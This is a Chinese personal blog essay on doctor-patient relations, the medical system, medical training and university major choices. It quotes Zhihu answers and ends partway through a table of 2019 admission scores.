<ul>
<li>公立医院医生</li>
<li>私立医院医生</li>
</ul>
<p>公立医院</p>
<ul>
<li>对患者认真负责的医生，医术也很好</li>
<li>对患者认真负责的医生，医术不行</li>
<li>对患者态度很差但是医术很好</li>
<li>对患者表面态度很好实际谋财害命</li>
<li>对患者表面态度不好，医术也不好</li>
</ul>
<p>据我观察，除了知乎相关问题和丁香园论坛，以及微博医学大V的评论区，就没几个说医生好话的。</p>
<p>打着公益献血的献血车可能是很多人（尤其是某些在校学生）第一次对白衣天使和医护人员美好印象的幻灭。</p>
<p>也唯有这种问题下，知乎群情激愤，连医护人员都不护短了</p>
<p>https://www.zhihu.com/question/265527652</p>
<p>那问题来了，在人民群众眼里，身穿白大衣的血站采血护士等和医院医护人员是不是一伙的？</p>
<p>你说不是一伙的那在这个社会主义国家他们是不是同属卫生部门？</p>
<p>截取一段知乎三万赞的回答</p>
<blockquote>
<p>这就是典型的违约，我知道血液的储存等都需要费用，但是当卫生部制作发放献血证的时候代表国家确认了上面的那句话。</p>
<p>这是国家给我的承诺。但是她违约了。</p>
</blockquote>
<p>那你说这医患矛盾——————</p>
<p>我看还远远不够，全国患者和广大人民群众民意汹涌程度再加10倍，才算有点意思</p>
<p>不过到时候人头太多，血站红十字会和计生就爆满了，轮到某些人的时候监狱不够用，当然领导不用急，领导先走，可以优先进秦城。</p>
<p>那</p>
<h3 id="知乎部分回答选摘">知乎部分回答选摘</h3>
<p>知乎，又名资乎。在医疗相关话题上又称医乎</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM4ODUwOTQ4">医患关系一直恶化下去会怎样？<i class="fa fa-external-link-alt"></i></span> 这个回答底下放眼望去，九成回答都是医生和医学生。</p>
<p>比如这个问题：为什么现在有些人不尊重老师和医生呢？怎样才是健康的医患关系和师生关系？</p>
<pre class="line-numbers language-none"><code class="language-none">发现一个非常有意思的情况

这个问题是关于老师和医生的，可是目前回答里几乎没有看到老师身影，80%都是医生在回答，尤其高赞的，而且大多数是批评老百姓的，真是有意思，不知是为啥。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>为数不多的一些问题</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyNzkxNzU0MQ==">请大家说一说对医生的看法，我是医生，我想听负面的，看看医患关系的主要矛盾在哪里？<i class="fa fa-external-link-alt"></i></span></p>
<p>难得的回答出现不同声音的问题：为什么知乎上关于医患关系的主流舆论站在医生一边？</p>
<pre class="line-numbers language-none"><code class="language-none">
我开始也站医生这边，直到看到一个患者做B超时，医生不顾及患者隐私，在患者未穿好衣服时候就喊下位进来。下面的评论全在阴阳怪气的嘲讽患者，顿时对这种风气极为反感。之后一个患者做了一个简单的挑手里的刺，收费大几百。我才发现知乎上的医学生连屁股也歪了。患者花费大几百，三个医生的治疗费只有几十块。是什么完美实现患者多花钱，医护少挣钱的。医生和患者同是资本和权利的受害者，医生确俨然觉得自己是资本和权利本身，站在患者对立面，喷患者。真分不清是屁股歪，还是短视。

作者：晓白
链接：https:&#x2F;&#x2F;www.zhihu.com&#x2F;question&#x2F;40289474&#x2F;answer&#x2F;1265159736
来源：知乎<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">知乎看久了，会对医生的认知产生割裂。知乎上的医生都是妙手仁心和蔼可亲，病患都是愚昧无知，口头禅是“好好一个人，怎么就没了呢？”而现实生活中呢，反正我见到的病人对着医生都是低声下气，而医生护士都各个趾高气扬对病人爱理不理，就算理了——不止一次见到病人或家属陪笑问医生问题，一句话还没说完，医生就怼了四五句。医生是不是都是精神分裂？

作者：黑喵警长酥酥
链接：https:&#x2F;&#x2F;www.zhihu.com&#x2F;question&#x2F;40289474&#x2F;answer&#x2F;974835166
来源：知乎
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">
作为曾经的护理人员，已离开这个行业好多年。

之前我还是很体谅医护人员辛苦，知道他们不容易，非常配合医护人员工作，有点小失误我都能理解，哪个医护人员不是在错误中成长的呢。

但是真的是他们不需要体谅。

我现在看病都要网上查阅一下，书本翻阅一下，有备而去。

我女儿2岁的时候有斜视的毛病，

网上说是视力有问题，建议查视力。

带她去儿科有名的三甲，医生看了看说是习惯问题，纠正就好了。

我说要查视力，医生说太小，没必要。

在我的坚持下，遗传散光200度，配了眼镜。

最近陪我妈甲状腺癌症术后复查，

真是气的我要死。

我妈一直没有盯着一个医生复诊，就是到了复诊时间，哪个医生坐班，就哪个医生复查。

但是一直按时按量吃药。

这次一查，医生劈头盖脸说我们服的药量不够，癌症复发。

我说我们是一直按照医嘱服药的。

她说那是你们没遇上我，其他医生就随便给你们开药的，如果是我不会这样。

我说那你帮我看一下开错药量的医生是哪个，病历本上字太潦草了，我不知道是什么名字，我去投诉。

她又说是我们的问题，是我们复诊时间晚了，是我们看到化验单的指标异常也不长点心，自己提前来医院。

我和我妈也不住在一起，她也不懂，我也有疏忽，没有关心，我也才刚看到指标，只知道她最近这个指标一直波动，在调整药量。

我说这个指标一直不在正常区间，所以一直来复查的，这次正好碰到疫情，晚了一个月来复诊。

她说那没办法，怪你们自己。

我当时就火了，我说行，是我们的问题，那你告诉我开错药量的医生的名字。

她就说你找别人干什么，是你们自己的问题干什么找别人。

我说你就说哪个人，你都说我妈癌症复发了，我总要问问他当时什么情况。

这个医生说你再不依不饶我就报警了，对着门诊护士说叫保安。

我就带着我妈走了，我还要带我爸去办理住院手续。

我对自己说再也不体谅医护人员，人家有保安有警察呢，我有什么？

哦～～～我有知道打人杀人违法，我不会干这些。

不知道干这些的人当时怎么想的。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">这些年对于医患关系中的患者行为也有些矫枉过正了，前段时间看到一个帖子，题主说自己在医院被误诊了，感到很生气，如何要求医院和医生对此事负责。我认为这是很正常的维护自己权利的行为，结果最高赞嘲讽了题主，说医生在诊断过程中出现误诊是很正常的现象，机器流水的线上还会出现误差呢。

作者：司马碧池Valeria
链接：https:&#x2F;&#x2F;www.zhihu.com&#x2F;question&#x2F;327917541&#x2F;answer&#x2F;784547555
来源：知乎
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

对，就像我去医院拆线，医生居然检查后告诉我没有线（问题是出院时她亲口告诉我需要拆线）。导致我伤口都掉痂愈合了才发现有线，惊恐地去医院拆线，这难道不比该拆的时候疼吗？我把事情发到知乎，有个医生居然觉得是我多事儿，医生没有责任，不该道歉。

只是让医生道个歉而已啊，这么难吗？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="百度为代表的咳咳">百度为代表的，咳咳</h3>
<p>百度对整个中文互联网环境恶化都负有不可推卸的责任，直接把网上冲浪体验降低了五个档次。</p>
<p><strong>不像其他东西一样可以上网搜，甚至单凭网上的信息解决问题比问其他人效果还好，医学内容搜出来。。。。 （像计算机的大多数简单问题，直接怼一句“你不会百度吗”，然后扔给他“提问的智慧”）</strong></p>
<p>没受过完整医学培训的人只会变成这个样子：<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI2Nzk2NTI0NA==">百度查病给你带来过阴影吗？<i class="fa fa-external-link-alt"></i></span></p>
<p>然而总有医生不仅不想给病人解释，还让病人去百度（不想解释就不解释呗，直接跟病人说爱信不信）</p>
<p><img src="/about-medical-industry/1613363948.png" /></p>
<p><img src="/about-medical-industry/1613556331.png" /></p>
<p>ps: 多说一句无关的，作者“一个拉钩的”身为协和医学博士信中医<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>，是一个比较有意思的观察样本。</p>
<p>这东西就没法让患者自己去了解，但凡真去搜了，一定演变成：之前医生在骗我，这病很重，患了绝症三天之内必死。然后怒骂医生，没病也给吓出病了。最终被莆田系谋财害命。</p>
<p>真的，医生不要让病人没事乱搜，病人想了解直接扔给他一个靠谱的科普网站、书籍之类的。</p>
<p><strong>魏则西</strong></p>
<h3 id="历史变迁">历史变迁</h3>
<p>现代医学发展起来以前各路巫医开开草药安慰剂，宗教信仰一般的存在，也很和谐（碰上曹操砍华佗那算倒霉） 赤脚医生那个年代很和谐，不过那个时候农村都是熟人社会，城市乡镇的国企和单位也是熟人社会。 在车匪路霸那个年代，收红包啊，庸医谋财害命啊，给人民群众留下了不好的印象。当然那个时候各行各业都乱。 大概1998-2010，经济发展特别快，房价也不是特别高，各行各业的矛盾都被掩盖了。 再后来经济增速放缓了，房价在14年暴涨，15年股灾，老龄化也来了，医保也恰好没钱了。 当然中央开会几次承诺要解决看病难看病贵的问题，然后医改改来改去...... 当然现任某大领导还特别喜欢中医。</p>
<h3 id="信息极度不对称">信息极度不对称</h3>
<p>不管网上描绘的医生多惨，大部分情况下医生对患者拥有绝对的信息差优势。而且人体又不像工厂流水线出产的产品，同样的病情有的能好有的就死了，也不好断案到底是谁的问题，跟家庭内部纠纷、家务事一样扯不清。</p>
<p>于是断案的时候基本都是偏向患者，就像有了家暴纠纷和骚扰指控通常会偏向妇女儿童，哪怕没有证据。 这种做法好不好呢，</p>
<h3 id="法律没用">法律没用</h3>
<p>毕竟这个地方“按闹分配”嘛，谁能闹谁有统战价值</p>
<h3 id="媒体煽风点火">媒体煽风点火</h3>
<p>不是骂医生就是骂医闹（大部分媒体，尤其是官媒，都是在骂患者和医闹）<br />
反正就把矛盾往这些上面引，闭口不提医保钱都去哪儿，怎么亏空的，为什么当初承诺的不给报销了。</p>
<p>不过当年呼风唤雨的报社和纸媒杂志没什么人看了，不管是国内的人日南周还是国外的CNN，都在人人上网的新时代遭到唾骂。</p>
<h2 id="规培">规培</h2>
<p>这个，冤有头债有主。华西一开始搞的还是不错的（至少看起来），然而，一推广.... 旗号包括提升基层医院水平，然而有了规培之后华西等三甲医院赚了，没有规培点的小医院亏了。</p>
<p>至于医学生：</p>
<ul>
<li>行会学徒制度</li>
<li>打杂苦力，轮转学到的也不多</li>
<li>钱又少拿三年</li>
<li>全面否定毕业证和执业医师考试</li>
<li>专硕性价比爆炸</li>
<li>离生化环材又近了一步</li>
</ul>
<p>你看隔壁生化环材，三十多大龄博士穷的叮当响只能向家里要钱啃老；越老越吃香，指既得利益的老人压榨新人；本科毕业没法直接工作。 此时，一个不知规培为何物的工科生打酱油路过强势围观.jpg</p>
<p>不过我人在成都，而且目前做的一堆项目和华西/川大有牵连，不多说了。</p>
<h2 id="失灵的公共卫生体系">失灵的公共卫生体系</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzY4MjQxMTUx">如何看待湖南桃江四中暴发群体性肺结核？<i class="fa fa-external-link-alt"></i></span></p>
<p>这次疫情之后可能亡羊补牢会有所好转，但愿吧。哈哈，怎么可能，人类总是重复相同的悲剧。</p>
<p>每次先知作为乌鸦嘴被烧死，战士死在了战场。</p>
<h2 id="医疗广告和互联网现状">医疗广告和互联网现状</h2>
<p>占坑，施工中</p>
<h3 id="医疗广告">医疗广告</h3>
<p>占坑，施工中</p>
<h3 id="百度和莆田系">百度和莆田系</h3>
<h3 id="医美和口腔">医美和口腔</h3>
<p>这些应该算是私立医院和广告最多的地方。也是最挣钱的。 从早年的百度莆田系、电视广告开始，到后来的小红书、美团、新康</p>
<h2 id="医保">医保</h2>
<p>这有些话说了肯定要查水表，罢了</p>
<!-- 

医保早就没钱了[停用部分医疗耗材是福是祸？](https://www.zhihu.com/question/67621140/answer/255464052)


>以前国家是喊口号，不动真格的，现在是不声不响却翻天覆地改变医疗现状。不仅仅是医报控费问题，而是去医疗包袱，医保广覆盖，维稳三位一体一次性解决。猜测步骤是：药品零差价（控药）→耗材停用（控医疗费用）→医疗器械零差价（控器械）→三级甲等医院停门诊（医疗分级，医疗下沉基层医院）→以上低水平，广覆盖解决老百姓医疗问题（三明政策终极目的）→五年后到十年间开始放开少量高端私立医院（同时放开医疗保险，法律监管等政策，五年内绝不会放开，最多口头鼓励，稍一深入思考就知道为什么了）→十年后开始大量放开高端私立医院。牺牲二十年的医疗，换得国家医疗长治久安。同时换一批人！留一个预言在这里，十年后看看有没有错。

>中国医生是不是价廉物美，要看怎么看。价廉是肯定的，同一疾病的花费绝对是全世界最便宜之一。物美不美要分开看，中国医生分布有个特点，就是工资一样，奖金差距不大。正当收入哪里都低的可怜，而职称和位置决定了……。从全国范围来讲，中国50%左右的基层医生，加上20%的民营医院医生，专科医院医生，军队医院医生…水平是及其低下的。其中人员大部分学历也是本科以下，这部分绝对谈不上物美。应该是价廉物不美。但很多规范的或附属的或大型的三乙以上的等等医院，医生来源基本都是正规科班出身硕士以上，常年轮转和经验集攒，主治及以下多是收入低廉。副主任以上虽然收入增高，但压力，科研，技术等要求明显也增高。这一部分绝对是价廉物美，来知乎的网友多是这一部分，所以容易愤愤不平，这一部分是受削剥的，占到30%左右。当然我国医学教育费用同国外比是便宜，主要因为我国教育整体都便宜，医学已经是我国教育里最贵的，也比国外便宜的多，国外家境不好的想学医几乎是做梦。医学教育门槛却是不低的，过去几十年长期霸具高考热门专业前排，分数线也是高高在上，也就这几年开始招不到人了，没落了。国家医保搞霸权定价，我是支持的，国家不是慈善家，要算账的，刚开始搞医保高水平广覆盖，我就觉得居心叵测，果然现在定价了，但是不对老百姓明言，让老百姓找医院去，矛盾转移的手段……哎，几十年来也没改过。

>70,80年代老百姓在社区和各级医院看病基本都是基本医疗，高干，有关系的可以看到好的医疗，其实，当时很和谐，老百姓不会因为自己的孩子得了痢疾死了而不满，也不会对高干和有关系的人看病像现在这样仇视。以后要看到好医生，也要看个人能力，经济条件，人脉关系等。现在主要是这二十年高效医疗胃口被调高了。一时半会下不来，所以国家先用基础医疗托住，然后崩掉重建，大家都落到基础医疗的地毯上，左望望，右望望，众生皆平等，就不会不满了。然后就像60,70年代一样，有钱的去大医院看病，没钱的在小医院挂挂水。现在我们医疗其实就是全民免费医疗，只有药品，器械，耗材才收了费，医疗基本不要钱（想想挂号费1元的主任），以后，药品，器械，耗材都会和医院脱钩。病人花了钱看过医生了，缺不一定有钱去买药买耗材。那时候，病人也不太好意思砍杀医生了，毕竟，看不起病是因为他没钱买药啊。所以，中医中药，气功大师，理疗等等未来有前途。因为这些不要去买昂贵的药，双手轻悬，一气化三清，暖暖暖洋腹中流过，气功大师的医疗不会太贵。国家现在不正也在鼓励吗？现在还没市场化呢，所有的私立医院和保险都是骗子在搞。

作者：匿名用户
链接：https://www.zhihu.com/question/67621140/answer/256173857 -->
<h2 id="报考和劝退等">报考和劝退等</h2>
<p>本来不想写这部分的，奈何今年医学相关专业的录取分数线暴涨，看到几个高中毕业的萌新听着不知道谁给的建议盲目乱报。今天听人说医生待遇低啦，哪又医闹砍人啦；明天又听说社会地位高福利待遇好做手术有红包啦；最后一打听学医背书又苦又累大学活的像高中又不想去了，在家长威逼利诱下只得不情愿的报了。</p>
<p>来，我们打开<span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vc2NvcmUv">你电的招生网<i class="fa fa-external-link-alt"></i></span>，拿19年看一下刚高考完的瓜娃子脑子能有多不清醒</p>
<p>这别不是被你电招生办给忽悠了吧（外加信软一群天生反骨的反贼从不护短一个个黑你电比我还狠，医学院的几乎全在说好话夸学校<a href="#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a>）</p>
<p>（别问我为什么就光逮着你电喷，别的学校我也不熟啊）</p>
<p><img src="/about-medical-industry/1612777596.png" /></p>
<p>19年，你电的四川本省主场，没有2020年医学分数暴涨的影响，应该比较典型。</p>
<p>通信 687 676 673</p>
<p>临床 667 662 659</p>
<p>信软 665 659 656</p>
<p>材料 669 664 661</p>
<p>护理 636 623 618</p>
<p>这就很离谱，虽然我整天喷你电，虽然沙河确实有点破，但是电子科技大学信息与软件工程的录取线比电子科技大学临床医学录取线还要低这.....认真的吗？护理分倒是比较冷静，估计是被网上一片劝退吓了回去。</p>
<p>你要说川大华西临床比川大软件工程录取线高，这听起来还很正常。你电这些孩子用这个分报临床，你说这是图什么呢？</p>
<p>你电医学院本科开始招生才两年，虽然学校和省医院、肿瘤医院、人民医院等给学生的资源倾斜还不错，但是和一些老牌的医学院比起来认可度和出路还是差不少。</p>
<p>你电信软的软件工程出路和待遇说一句不比华西临床差应该还是有底气的。虽然你软很多阴间操作和只会念PPT的老师，去996修福报等出路和薪资已经足以抵消一切。</p>
<p>而且本科三年上课加一年实习直接跑路找工作比隔壁学医的五+三+规培（有的还再读个博）的煎熬稳太多了。</p>
<p>围观刚高考完的萌新们报志愿总让想起我四年前无知的我看着网上道听途说的消息乱报的样子，看到有些孩子踩坑还是于心不忍。还是说点什么。</p>
<p><del>注意身边亲戚朋友劝你学医的时候可能只是想有一个免费医生</del></p>
<h3 id="待遇问题">待遇问题</h3>
<p>要恰饭的嘛，人可不可能不恰饭，医生挣不了钱要饿死的嘛</p>
<blockquote>
<p>医护人员的待遇不能一概而论</p>
</blockquote>
<p>注意乡村卫生院、县市医院、某些三甲的巨大差距。</p>
<p>注意不同地区的医保政策财政盈余和医院工资福利存在巨大的差异。</p>
<p>注意考虑省会城市、县城、村镇的房价和消费水平。</p>
<p>貌似看这几年报志愿的大部分还是冲着待遇去的，真心喜欢学医的不是特别多。</p>
<h3 id="强基计划">强基计划</h3>
<p>（这一部分写的比较早，下面的今年都指的是2020）</p>
<p>今年自招和竞赛生降分几乎无了，新上了综合评价和强基计划</p>
<p>恩，2020年教育部上了一大批羟基计划，基本上除了天坑专业就是基础研究，适合读书改变命运的不多（啊，如果是指反向改变命运，那很多）。 这次的招生政策和降分等对于高中竞赛党是沉重的打击。竞赛党基本上被坑惨了。对真正想投身科研的一部分竞赛党和有情怀的学生，今年 虽然名字叫羟基，但是实际政策沉重打击了真正有天赋和有热情的一部分竞赛党，很多有天赋的人可能只能多卷三年将时间浪费在挤高考的独木桥上，运气不好的偏科同学无缘科研。教育部这几年的挨骂操作我都数不过来了，不过讲这些就又跑题了，不说了。</p>
<p>生化环材方向的约等于卖身契，这个劝退的太多了，真喜欢或者家里有钱也不建议去，不说了。 数学物理等方向的看个人天赋、情怀和家境吧。</p>
<p>今年把基础医学也放到强基计划里面了。</p>
<p>大致看了一下，基础医学这块还是比生物化学天坑好一点。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM5MTA3NjU4Ng==">你如何看待强基计划？<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM5Mjk1MTEzMA==">如何看待 2020 年最新发布的强基计划简章？<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="某些理工科最近开始建设的医学院">某些理工科最近开始建设的医学院</h3>
<p>太长不看：</p>
<blockquote>
<p>反正你听到新开的院系所谓交叉学科赶紧跑就是了，尤其是本科（贵清叉院除外）</p>
</blockquote>
<p>肥科合并安徽省医院，你电跟四川省医院和肿瘤医院搞的医学院。</p>
<p>华理、天大、哈工大、中科大、西大、西北工业</p>
<p>这么多大学基本上在这几年（2014至今）突然想搞医学院，当然不是打算医工结合，为人类健康事业做贡献，主要还是冲着发论文去的。</p>
<p>生物医学论文影响因子又高，灌水又快，只要舍得砸钱，文章稳定产出，这谁不喜欢。你看看新英格兰和柳叶刀的的影响因子，再看看那些纯数顶刊的影响因子。你看看生物医学的灌水速度和砸钱投入与产出，再看看高能所和肥科粒子物理那帮人，几十个亿不当钱一样，发出来PRL才这么点影响因子。隔壁肥科的领导都看哭了，立马决定<del>废理兴工</del>废理兴医</p>
<h3 id="关于数理功底">关于数理功底</h3>
<p>数理天赋非常好的不推荐报考临床、基础医学、生化环材等。</p>
<p>为什么材料学院发展至此? - 霍华德的回答 - 知乎 https://www.zhihu.com/question/391942345/answer/1216144250</p>
<h3 id="生物医学工程">生物医学工程</h3>
<p>这是个大框，啥都能往里装。包括但不限于生物材料、生物力学、医疗器械（弱电为主）、医疗器械（机械为主）、生物医药、偏医学方向（五年制，有的还开在医学院下面拿医学学位）</p>
<p><strong>报考的时候不要报就对了，这个听我的肯定没错</strong></p>
<h3 id="护理">护理</h3>
<p>这个经常被考生和家长嫌弃，尤其是考的还不错的孩子，在他们看来护理卫校是中专、三本、带专生上的。</p>
<p>怎么说，现在一些热门的医学分数本来就非常高，今年由于疫情等缘故又被炒高了很多，很有可能复现十年前土木最火的时候高分接盘的惨状。而护理由于网上一片哀嚎，一本以上学校的护理分数非常低，经常比同学校的临床低几十分甚至断档。差不多是情况特殊的人为数不多捡捡漏的途径。</p>
<p>有缘人：</p>
<ol type="1">
<li>真心热爱（这种应该不多）</li>
<li>家里有关系（混几年能混个护士长护理部主任啥的）</li>
<li>低分进入某校转专业，考公考选调</li>
<li>出国</li>
<li>男的</li>
<li>长得招人喜欢、身高160+</li>
</ol>
<p>第1条，护理网上说的再惨，也惨不过生化环材，如果真的热爱（完全不在乎钱和待遇的那种）去也无妨。当然累和夜班是避免不了的，除非你去CRC（看起来竞争很激烈的样子，感觉人均硕士博士，等今年的高中生至少十年后毕业不知道会内卷成什么样子）</p>
<p>第5、6条应该不需要多解释，男的在护理的抢手程度可能比壮汉在骨科还抢手，160+可能找工作时大于研究生学历（你不信我也没办法，事实就是这个样子）</p>
<p>第3条，高考考砸了几十分特别不甘心但又不愿意复读可以试试，不过风险比较大</p>
<p>第2条，嗯，如果本身学校还不错，凭着文凭和家里关系能走上评职称升值的快车道。本来护理平均学历就远比临床低，但凡有点关系又嫌苦嫌累嫌社会地位和牌面不如医生，评职称阻力远小于医生。</p>
<p>第4条，<del>去非洲</del>去北美或者土澳还行（不要看）</p>
<p>另外不知道为什么网上所有跟护理相关的话题都在说学护理出路比学医差多了，在川内的几个医院暗中观察看起来似乎收入和前途并不比医生差。</p>
<p>也可能是我的观察出了偏差，至少暗中观察看到的（四川省）护士待遇并不比医生差，考虑平均学历差距和早工作几年的情况下</p>
<p><strong>甚至一些科室，尤其是，心内科、重症，护士待遇比医生好，算上学历差距和早工作几年，护士应该比医生好的多，跟我之前的想像和网上的看到的护士哭惨完全不一样</strong></p>
<p>护理不存在这个问题，一本以下是性价比最高的报考专业之一。护理在211以上的分数段是这个画风，但凡在网上搜一下很少有人被骗进来。</p>
<p>另一个需要记住的是<strong>工作要趁早</strong>，中专&gt;大专，本科&gt;研究生。</p>
<p>虽然中专没有编制，但是跟其他职业学院的其他专业比起来性价比依然爆炸。在离家近的小县城和卫生所， 大专大概率一样没有编制还多上三年高中，亏了三年。 研究生多上这么多年，亏惨了。</p>
<p><strong>不太建议国内全日制读研读博，先工作，然后读在职的</strong>，全日制研究生没啥性价比可言</p>
<h3 id="学医">学医</h3>
<h4 id="临床">临床</h4>
<p>这里我不懂就不乱说了。情况很复杂，自己要打听好。 国内情况比较复杂，五年七年八年硕八年博还有混乱的规培专培实习政策。五年之内可能政策还要朝令夕改。</p>
<h4 id="基础医学">基础医学</h4>
<p>和生化环材并没有本质不同，待遇比生环环材好一点，比临床差很多。我说完了。</p>
<h4 id="公卫预防法医军医等">公卫预防法医军医等</h4>
<p>也不懂。</p>
<h3 id="药学">药学</h3>
<p>送上弗兰克扬的一句话：药学和四大天坑专业并没有什么不同</p>
<p>有想着开发药物为人类健康事业做贡献的，不是很建议（除非家里有矿）</p>
<h3 id="番外">番外</h3>
<p>不得不说你电招生办真的能忽悠，我都差点被这一堆改来改去的名字给骗了。</p>
<table style="width:100%;">
<colgroup>
<col style="width: 65%" />
<col style="width: 6%" />
<col style="width: 6%" />
<col style="width: 6%" />
<col style="width: 15%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">专业</th>
<th style="text-align: center;">最高分</th>
<th style="text-align: center;">平均分</th>
<th style="text-align: center;">最低分</th>
<th>扒皮</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTMz">信息管理与信息系统<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">663.00</td>
<td style="text-align: center;">662.00</td>
<td style="text-align: center;">661.00</td>
<td>公，公管学院？</td>
</tr>
<tr class="even">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTI0">自动化(智能制造实验班)<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">672.00</td>
<td style="text-align: center;">671.00</td>
<td style="text-align: center;">670.00</td>
<td>就自动化呗</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTIy">智能电网信息工程(“互联网＋”复合培养实验班)<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">680.00</td>
<td style="text-align: center;">676.00</td>
<td style="text-align: center;">673.00</td>
<td>能源学院，还行吧（差点以为是机电的）</td>
</tr>
<tr class="even">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTI5">新能源材料与器件(“互联网＋”复合培养实验班)<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">679.00</td>
<td style="text-align: center;">674.40</td>
<td style="text-align: center;">672.00</td>
<td>虽然有器件两字，灌水材料，快跑（想搞芯片去沙河集电）</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTM2">物联网工程(“互联网＋”复合培养实验班)<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">683.00</td>
<td style="text-align: center;">680.40</td>
<td style="text-align: center;">679.00</td>
<td>物联网几年前火过</td>
</tr>
<tr class="even">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTE5">数学与应用数学(“互联网＋”复合培养实验班)<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">678.00</td>
<td style="text-align: center;">675.60</td>
<td style="text-align: center;">675.00</td>
<td>数学学院</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTE5">数学类(数据科学与计算、数学及应用、计算科学)<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">671.00</td>
<td style="text-align: center;">670.40</td>
<td style="text-align: center;">670.00</td>
<td>同上</td>
</tr>
<tr class="even">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTIw">生物医学工程类<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">665.00</td>
<td style="text-align: center;">661.20</td>
<td style="text-align: center;">660.00</td>
<td>生命学院今年的大类招生(听我的，赶紧跑)</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTI2">人工智能<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">683.00</td>
<td style="text-align: center;">676.40</td>
<td style="text-align: center;">673.00</td>
<td>计院的</td>
</tr>
<tr class="even">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTM1">经济管理试验班(管理与电子工程复合培养)<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">678.00</td>
<td style="text-align: center;">672.60</td>
<td style="text-align: center;">671.00</td>
<td>所以为啥不去西财</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTI2">计算机类<i class="fa fa-external-link-alt"></i></span></td>
<td style="text-align: center;">683.00</td>
<td style="text-align: center;">677.70</td>
<td style="text-align: center;">674.00</td>
<td>计院</td>
</tr>
<tr class="even">
<td style="text-align: center;"><span class="exturl" data-url="aHR0cHM6Ly96cy51ZXN0Yy5lZHUuY24vemhhb3Mvc2hvd3Byb2R1Y3QucGhwP2lkPTI2">计算机科学与技术(“互联网＋”复合培养实验班)<i class="fa fa-external-link-alt"></i></span></td>
